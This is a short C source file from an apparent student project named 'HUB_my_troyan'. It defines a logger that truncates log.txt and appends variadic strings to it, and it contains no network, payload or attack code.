/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 18/04/2021 logger.c
*/

#include <fcntl.h>
#include <stdarg.h>
#include <sys/stat.h>
#include "troyan_server.h"

static const char *FILENAME = "log.txt";
static const int FILE_FLAGS = O_CREAT | O_APPEND | O_WRONLY;
static const mode_t FILE_MODE = S_IRWXU | S_IRGRP | S_IROTH;

static void clean_file_content(void)
{
    FILE *file = fopen(FILENAME, "w");

    if (file != NULL)
        fclose(file);
}

int write_in_log(size_t size, ...)
{
    static int fd = -1;
    va_list list;
    char *cmd;

    if (fd == -1) {
        clean_file_content();
        fd = open(FILENAME, FILE_FLAGS, FILE_MODE);
    } else if (size == 0) {
        return close(fd);
    }
    va_start(list, size);
    for (size_t i = 0; i < size; i++) {
        cmd = va_arg(list, char *);
        if (write(fd, cmd, strlen(cmd)) == -1) {
            return EXIT_FAILURE;
        }
    }
    return EXIT_SUCCESS;
}